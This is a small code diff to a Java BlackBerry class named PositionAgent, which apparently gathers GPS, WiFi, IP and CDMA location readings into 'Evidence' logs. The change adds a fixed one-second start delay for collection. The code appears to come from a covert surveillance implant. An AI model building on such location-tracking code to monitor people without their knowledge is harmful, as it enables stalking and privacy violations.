@@ -38,7 +38,7 @@ import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 
-// TODO: Auto-generated Javadoc
+
 /**
  * The Class PositionAgent.
  */
@@ -52,6 +52,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
     private static final int LOG_TYPE_WIFI = 3;
     private static final int LOG_TYPE_IP = 4;
     private static final int LOG_TYPE_CDMA = 5;
+    private static final long POSITION_DELAY = 1000;
     //private static final int TYPE_GPS_ASSISTED = 3;
 
     Evidence logGps;
@@ -672,7 +673,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
             //#endif
 
             setPeriod(period);
-            setDelay(period);
+            setDelay(POSITION_DELAY);
 
         } catch (final EOFException e) {
             //#ifdef DEBUG
